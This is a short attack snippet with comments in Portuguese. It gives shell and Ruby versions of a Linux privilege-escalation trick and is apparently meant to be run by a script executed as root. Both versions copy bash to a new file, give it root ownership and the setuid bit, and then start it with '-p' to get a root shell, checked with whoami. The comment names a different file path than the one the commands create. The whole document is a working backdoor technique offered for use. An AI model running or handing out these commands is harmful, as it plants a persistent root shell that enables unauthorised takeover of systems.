# Cria uma cópia do bash com permissões de root 
# Alterar para o diretório / e chamar a bash //bashrt -p 
# whoami para validar

Shell 
#!/bin/bash
cp /bin/bash /bashrt2  && chmod +x /bashrt2  && chown root:root /bashrt2 && chmod u+s /bashrt2


RUBY :
#!/usr/bin/env ruby
exec 'cp /bin/bash /bashrt2  && chmod +x /bashrt2  && chown root:root /bashrt2 && chmod u+s /bashrt2'

#Executar o script com /bin/ruby escalation.rb 
